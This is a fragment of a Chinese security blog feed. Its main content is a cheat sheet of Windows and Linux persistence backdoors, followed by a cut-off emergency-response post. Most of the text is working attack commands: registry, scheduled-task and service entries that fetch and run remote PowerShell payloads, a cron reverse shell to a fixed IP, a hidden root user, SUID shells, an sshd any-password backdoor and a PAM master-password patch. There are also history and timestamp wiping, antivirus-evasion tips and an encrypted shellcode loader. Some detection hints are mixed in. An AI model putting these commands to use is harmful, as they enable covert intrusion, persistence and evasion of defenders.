class=\"line\">HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\"></span><br><span class=\"line\">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure>\n<p><strong>不落地的后门通过 cs 的 web 投递生成</strong></p>\n<p>使用以下命令可以一键实现无文件注册表后门：不落地</p>\n<p><code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring('http://192.168.174.131/a'))\\&quot;&quot; /f</code></p>\n<p><strong>Logon Scripts 后门</strong></p>\n<p>注册表路径：HKEY_CURRENT_USER\\Environment\\</p>\n<p>创建字符串键值：  UserInitMprLogonScript，键值设置为 bat 的绝对路径： <code>c:\\test.bat</code></p>\n<p><strong>userinit 后门</strong></p>\n<p>在用户进行登陆时，winlogon 运行指定的程序。根据官方文档，可以更改它的值来添加与删除程序。</p>\n<p>利用 USERINIT 注册表键实现无文件后门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]</span><br><span class=\"line\"> </span><br><span class=\"line\">&quot;Userinit&quot;=&quot;C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-组策略设置脚本启动\"><a class=\"markdownIt-Anchor\" href=\"#0x02-组策略设置脚本启动\">#</a> 0x02 组策略设置脚本启动</h4>\n<p>运行 gpedit.msc 进入本地组策略，通过 Windows 设置的 “脚本 (启动 / 关机)” 项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109181141835.png\" alt=\"image-20221109181141835\"></p>\n<p>脚本名写 powershell 绝对路径，脚本参数写 web 投递后门</p>\n<h4 id=\"0x03-计划任务\"><a class=\"markdownIt-Anchor\" href=\"#0x03-计划任务\">#</a> 0x03 计划任务</h4>\n<p>通过 window 系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p>\n<p>使用以下命令可以一键实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /sc minute /mo 1 /tn &quot;Security Script&quot; /tr &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(\\&quot;\\&quot;\\&quot;http://192.168.3.48:8080/T5uEhVubWqF\\&quot;\\&quot;\\&quot;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p>容易遇到的问题：cmd 命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p>\n<p>合理的日期：某月某月凌晨三点</p>\n<h4 id=\"0x04-服务自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x04-服务自启动\">#</a> 0x04 服务自启动</h4>\n<p>通过服务设置自启动，结合 powershell 实现无文件后门。</p>\n<p>使用以下命令可实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc create &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.3.48:8080/T5uEhVubWqF&#x27;))\\&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class=\"line\">sc config Name start= auto                //设置这个服务为自动启动</span><br><span class=\"line\">net start Name                            //启动服务</span><br></pre></td></tr></table></figure>\n<p>成功创建了一个自启动服务</p>\n<p><strong>通过服务自启动上线权限为 system</strong></p>\n<h4 id=\"0x05-wmi后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05-wmi后门\">#</a> 0x05 WMI 后门</h4>\n<p>在 2015 年的 blackhat 大会上 Matt Graeber 介绍了一种无文件后门就是用的 WMI。这里可以利用一个工具 powersploit，下面用它的 Persistence 模块来示范一个简单的例子。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Persistence\\Persistence.psm1</span><br><span class=\"line\">$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At &#x27;3 PM&#x27;</span><br><span class=\"line\">$UserOptions = New-UserPersistenceOption -Registry -AtLogon</span><br><span class=\"line\">Add-Persistence -FilePath .\\web.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</span><br></pre></td></tr></table></figure>\n<h3 id=\"linux-2\"><a class=\"markdownIt-Anchor\" href=\"#linux-2\">#</a> linux</h3>\n<h4 id=\"0x00隐藏文件\"><a class=\"markdownIt-Anchor\" href=\"#0x00隐藏文件\">#</a> 0x00 隐藏文件</h4>\n<p>Linux 下创建一个隐藏文件： <code>touch  .test.txt</code></p>\n<h4 id=\"0x01隐藏文件时间戳\"><a class=\"markdownIt-Anchor\" href=\"#0x01隐藏文件时间戳\">#</a> 0x01 隐藏文件时间戳</h4>\n<p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>\n<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>\n<p>touch -r index.php webshell.php</p>\n<p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p>\n<p>touch -t 1401021042.30 webshell.php</p>\n<h4 id=\"0x03-隐藏权限\"><a class=\"markdownIt-Anchor\" href=\"#0x03-隐藏权限\">#</a> 0x03 隐藏权限</h4>\n<p>在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chattr +i evil.php 锁定文件</span><br><span class=\"line\">lsattr  evil.php   属性查看</span><br><span class=\"line\">chattr -i evil.php 解除锁定</span><br><span class=\"line\">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04隐藏历史命令\"><a class=\"markdownIt-Anchor\" href=\"#0x04隐藏历史命令\">#</a> 0x04 隐藏历史命令</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[space]set +o history</span><br><span class=\"line\">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure>\n<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">history -d [num]</span><br></pre></td></tr></table></figure>\n<p>这种技巧是关键记录删除，或者我们可以暴力点，比如前 150 行是用户的正常操作记录，150 以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前 150 行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05隐藏ssh\"><a class=\"markdownIt-Anchor\" href=\"#0x05隐藏ssh\">#</a> 0x05 隐藏 ssh</h4>\n<p>#隐身登录系统，不会被 w、who、last 等指令检测到。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T root@127.0.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure>\n<p>这是因为 w 命令显示信息来源于 utmp，last 来源于 wtmp，并不是所有程序登录的时候都会调用 utmp 和 wtmp 日志记录接口，只有交互式会话，才会调用 utmp 和 wtmp 的日志记录接口，比如通过 tty 或者 pts 或者图形界面登录的都会调用 utmp 和 wtmp 日志记录接口，然后我们在使用 w 和 last 命令的时候就会发现登录信息</p>\n<p>不记录 ssh 公钥在本地.ssh 目录中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br><span class=\"line\">-T 表示不分配伪终端 （正常的会话，在分配伪终端之后才会调用utmp和wtmp的日志接口）</span><br><span class=\"line\">/usr/bin/bash -i  表示在登录之后 调用bash命令</span><br><span class=\"line\">-i 表示是交互式shell</span><br></pre></td></tr></table></figure>\n<p>ssh -lroot 192.168.12.51/usr/bin/bash 其实就相当于登录之后直接调用 bash 这个名，此时系统没有为其分配 tty，不算一个完整交互式会话，只不过 bash 接受输入，然后有输出，让我们误以为是交互式会话，其实不然，你可以将 /usr/bin/bash 替换成 /usr/bin/ls 试一下，就是简单执行以下就退出了</p>\n<p>通过 ps -ef  和 lsof -i:22  仍然可以看到</p>\n<p>如果已经退出，那么可以到 secure 日志中找</p>\n<h4 id=\"0x06端口复用\"><a class=\"markdownIt-Anchor\" href=\"#0x06端口复用\">#</a> 0x06 端口复用</h4>\n<p>第二种方式：利用 IPTables 进行端口复用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 端口复用链</span><br><span class=\"line\">iptables -t nat -N LETMEIN</span><br><span class=\"line\"># 端口复用规则</span><br><span class=\"line\">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class=\"line\"># 开启开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathuntercoming&#x27; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class=\"line\"># 关闭开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathunterleaving&#x27; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class=\"line\"># let&#x27;s do it</span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启复用</span><br><span class=\"line\">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class=\"line\">#ssh使用80端口进行登录</span><br><span class=\"line\">ssh -p 80 root@192.168.28.128</span><br><span class=\"line\">#关闭复用</span><br><span class=\"line\">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x00添加用户\"><a class=\"markdownIt-Anchor\" href=\"#0x00添加用户\">#</a> 0x00 添加用户</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 创建一个用户名guest，密码123456的root用户</span><br><span class=\"line\">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\"># 查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x01suid\"><a class=\"markdownIt-Anchor\" href=\"#0x01suid\">#</a> 0x01SUID</h4>\n<p>Suid shell 是一种可用于以拥有者权限运行的 shell。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配合普通用户权限使用</span><br><span class=\"line\">cp /bin/bash /tmp/shell</span><br><span class=\"line\">chmod u+s /tmp/shell</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp/shell</span><br><span class=\"line\">一般将其命名为find等系统命令，存在位置为/usr/bin</span><br></pre></td></tr></table></figure>\n<p>排查技巧：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 在Linux中查找SUID设置的文件</span><br><span class=\"line\">find . -perm /4000 </span><br><span class=\"line\"># 在Linux中查找使用SGID设置的文件</span><br><span class=\"line\">find . -perm /2000</span><br><span class=\"line\"># 取消s权限</span><br><span class=\"line\">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-ssh免密登录\"><a class=\"markdownIt-Anchor\" href=\"#0x02-ssh免密登录\">#</a> 0x02 ssh 免密登录</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa\t</span><br></pre></td></tr></table></figure>\n<p>再将公钥复制到.ssh 中 <code>/root/.ssh/authorized_keys</code></p>\n<h4 id=\"0x03-软连接\"><a class=\"markdownIt-Anchor\" href=\"#0x03-软连接\">#</a> 0x03 软连接</h4>\n<p>在 sshd 服务配置运行 PAM 认证的前提下，PAM 配置文件中控制标志为 sufficient 时只要 pam_rootok 模块检测 uid 为 0 即 root 权限即可成功认证登陆。通过软连接的方式，实质上 PAM 认证是通过软连接的文件名  <code>/tmp/su</code>  在 <code>/etc/pam.d/</code>  目录下寻找对应的 PAM 配置文件 (如: /etc/pam.d/su)，任意密码登陆的核心是 <code>auth sufficient pam_rootok.so</code> ，所以只要 PAM 配置文件中包含此配置即可 SSH 任意密码登陆，除了 su 中之外还有 chsh、chfn 同样可以。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure>\n<p>执行完之后，任何一台机器 <code>ssh root@IP -p 8888</code> ，输入任意密码，成功登录。</p>\n<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>\n<h4 id=\"0x04crontab反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#0x04crontab反弹shell\">#</a> 0x04crontab 反弹 shell</h4>\n<p>crontab 命令用于设置周期性被执行的指令。新建 shell 脚本，利用脚本进行反弹。</p>\n<p>a、创建 shell 脚本，例如在 /etc/evil.sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p><code>chmod +sx /etc/evil.sh</code></p>\n<p>b、crontab -e 设置定时任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#每一分钟执行一次</span><br><span class=\"line\">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure>\n<p>重启 crond 服务， <code>service crond restart</code> ，然后就可以用 nc 接收 shell。</p>\n<h4 id=\"0x05pam后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05pam后门\">#</a> 0x05pam 后门</h4>\n<p>PAM （Pluggable Authentication Modules ）是由 Sun 提出的一种认证机制。它通过提供一些动态链接库和一套统一的 API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM 最初是集成在 Solaris 中，目前已移植到其它系统中，如 Linux、SunOS、HP-UX 9.0 等。</p>\n<p>利用方法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class=\"line\">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class=\"line\">3、编译安装PAM</span><br><span class=\"line\">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1、通过Strace跟踪ssh</span><br><span class=\"line\">ps axu | grep sshd</span><br><span class=\"line\">strace -o aa -ff -p PID</span><br><span class=\"line\">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class=\"line\"># 2、检查pam_unix.so的修改时间</span><br><span class=\"line\">stat /lib/security/pam_unix.so      #32位</span><br><span class=\"line\">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/27/yuque/emergency%20response/",
            "url": "http://example.com/2022/05/27/yuque/emergency%20response/",
            "title": "应急响应",
            "date_published": "2022-05-27T05:38:45.000Z",
            "content_html": "<h1 id=\"emergency-response\"><a class=\"markdownIt-Anchor\" href=\"#emergency-response\">#</a> emergency response</h1>\n<h2 id=\"入侵排查\"><a class=\"markdownIt-Anchor\" href=\"#入侵排查\">#</a> 入侵排查</h2>\n<h3 id=\"windows\"><a class=\"markdownIt-Anchor\" href=\"#windows\">#</a> Windows</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.生成msf木马</span><br><span class=\"line\">msfvenom -p LHOST LPORT -f</span><br><span class=\"line\"></span><br><span class=\"line\">2.监听</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload </span><br><span class=\"line\">set lohost</span><br><span class=\"line\">set lport</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>msf 中可以在网络链接中找到，但任务管理器找不到</p>\n</blockquote>\n<h4 id=\"端口\"><a class=\"markdownIt-Anchor\" href=\"#端口\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;netstat -ano | findstr &quot;ESTABLISH&quot;</span><br><span class=\"line\">  TCP    10.128.50.84:49893     42.81.179.166:80       ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49898     42.81.193.250:443      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49919     103.212.12.39:3000     ESTABLISHED     2208</span><br><span class=\"line\">  TCP    10.128.50.84:57229     119.3.227.186:11113    ESTABLISHED     35024</span><br><span class=\"line\">  TCP    10.128.50.84:57357     113.142.50.195:443     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57413     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57462     117.62.242.202:80      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:57464     120.133.59.142:443     ESTABLISHED     6056</span><br><span class=\"line\">  TCP    10.128.50.84:57474     120.133.59.142:443     ESTABLISHED     6484</span><br><span class=\"line\">  TCP    10.128.50.84:57483     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:59370     101.89.15.105:443      ESTABLISHED     33384</span><br><span class=\"line\">  TCP    10.128.50.84:59493     20.198.162.76:443      ESTABLISHED     11804</span><br><span class=\"line\">  TCP    10.128.50.84:59899     150.158.219.208:443    ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63118     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63177     20.197.71.89:443       ESTABLISHED     11804</span><br></pre></td></tr></table></figure>\n<h4 id=\"进程\"><a class=\"markdownIt-Anchor\" href=\"#进程\">#</a> 进程</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;tasklist /svc | findstr 2208</span><br><span class=\"line\">LenovoInternetSoftwareFra     2208 暂缺</span><br></pre></td></tr></table></figure>\n<p>软件查杀</p>\n<blockquote>\n<p>PCHunter</p>\n<p>分析进程，分析签名，corporation 等</p>\n<p>火绒剑<br>\n process，autorun</p>\n<p>Process Monitor</p>\n</blockquote>\n<p>删除进程</p>\n<blockquote>\n<p>taskkill /F /T /PID 2208</p>\n<p>参数列表:</p>\n<pre><code>/S    system           指定要连接的远程系统。\n\n/U    [domain\\]user    指定应该在哪个用户上下文执行这个命令。\n\n/P    [password]       为提供的用户上下文指定密码。如果忽略，提示\n                       输入。\n\n/FI   filter           应用筛选器以选择一组任务。\n                       允许使用 &quot;*&quot;。例如，映像名称 eq acme*\n\n/PID  processid        指定要终止的进程的 PID。\n                       使用 TaskList 取得 PID。\n\n/IM   imagename        指定要终止的进程的映像名称。通配符 '*'可用来\n                       指定所有任务或映像名称。\n\n/T                     终止指定的进程和由它启用的子进程。\n\n/F                     指定强制终止进程。\n\n/?                     显示帮助消息。\n</code></pre>\n</blockquote>\n<p>找一些小众的 C2 框架，提升过免杀的概率</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTk3NzY3\">https://cloud.tencent.com/developer/article/1597767</span></p>\n<p>CS 上线</p>\n<blockquote>\n<p>netstat 中开始没有 cs 的连接，只有当 cs 中发出命令时才会建立连接，并且服务器发完命令立刻中断连接</p>\n<p>建立连接时间为 sleep</p>\n<p>因为受害者和攻击者通过中间的 teamserver 建立连接</p>\n</blockquote>\n<p>找进程</p>\n<blockquote>\n<p>tasklist  前提是没有注入进程</p>\n<p>注入进程后使用工具</p>\n</blockquote>\n<p>免杀通过 rc4 加密，比 aes 更好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import pickle as json</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">import urllib.request</span><br><span class=\"line\">import codecs</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"># pick = &quot;&quot;&quot;</span><br><span class=\"line\"># json.loads(base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;bJ9jdms4c1viEV0L0iuxuBW8ciWoHvBztGfjIABjtw9js5ZCPByXWk6b9PW+9B5FPtqR1pcua3p7ZEBN6RecOcSBOgw3O06TVwJ4861eeIugI3HWEHzF9uspTVMKIQeTfHl/9xU5YyYBM0QqqAYe4cRAjVy7ZuQ7m/MpskJ6hH58S0/xvuq+qbbhiNff4tzoW4c84k+w2RCnVTpX6+PHNlSBex0B1Z4iJUQvfORLZGD64SFESnNVHoGo1uiAMcHXGoSZv4jG5bEUYPte0QDyyAoUdtF9gxm/3862yRpdFkEceURMg2Df7BIS2wUM3WOmzyXc85w3DR6VESppNIpU0MFQYsaRJ9PAqvsWnmeoXGg/KrlYZXvl5cAdMOSe3JiXJZhMoCvIAjkVXerSZ8wA2v6QVoo1hY3M8tOUAlTvQjqDr5diLnpte8Fp0L+HKDEnPew2HLFI0Jql9PpiHQUV9o6y2+KjzoPXMFWTxbsU7pBoe43rISgJycyRG1t59e6UKhnoGkZ1bu4XhJQ0w46W4EOVkteGc37YsZDu+qruWHXw4wsZNjZaYVodCH4zHxm9y8QrNlpSoZK7RXJoj1sxjJ7fOuOGciEzxIoDdfCo9uVCInDv1efJa8mCoh7apRDYtpAEhDLm+1hMqqDEgNdFH+Wny4dQjEiK/4EJgcfyB6c3+3w19k495ZozYAUGTsoiA1RDPDKIRvY7R6IPnOa84buw6JV1wgP/ly4t94hIiXUFudpP3Ir4ireKF4tywpDlFpyUSTttj9SFuUO8imGsvU/VP07IdKX4+5Q3V5jASbn6iQVWv7Grl5OC7d49gXl7LTXmaVZoRVYRf6u2Ct0VlsC1dG4VZAFiSwaWhn/iZkRGe5ETzqQxQKJE8X8UXhiFf9jXb/ojg5hcoIy9H2f5R0Qh2735dU4Kl98qDpBw2+HT2YbE9vvza3igGYpzsaMjBwUrdhQi0V1tvqwn+D++HxFafdbNjZcEkqx6QMmaCE08prKVbVoisO4EDDdzj1RZx72iLnvJ70ywS0D3WPsPrMXDJ+j1nm8HeWN/4Hgw7/mr9c+YE/dvkVFRG1+TU6ROvqoc1GPh4/2w5D6BD6nZevXwBYDqFBLnTydejM+vmmEdJOjaEEGiSoOa6eykpF8E5ReMFrHBwY/lY0EMd8oF2gwwumcC2cSseI4E5NWBH4g02iaBqNM1s4PNOmK87+Wmq+EWmFi5dna68mxBMQRXatCsdO5/TgMPDUbd9WqraC2J6XPFxEG6cV2vwFuYAvrLgC2HKWbW3cvxLtw/ug